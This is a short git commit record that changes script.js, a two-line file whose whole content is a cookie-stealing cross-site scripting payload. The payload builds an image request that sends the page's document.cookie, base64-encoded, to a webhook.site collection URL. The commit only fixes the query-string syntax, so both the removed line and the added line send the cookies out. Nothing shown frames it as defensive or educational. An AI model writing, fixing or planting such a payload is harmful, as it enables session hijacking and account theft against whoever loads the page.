3708853a913572856d4e94c7d31f7e5a9f6698a0
kond3 <67697200+kond3@users.noreply.github.com>
2025-06-16 21:52:58 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 x = New Image();
-x.src = "https://webhook.site/7e9d6fc0-a8c7-4fb4-9e9f-fec356771892/cookies="+btoa(document.cookie)
+x.src = "https://webhook.site/7e9d6fc0-a8c7-4fb4-9e9f-fec356771892?cookies="+btoa(document.cookie);
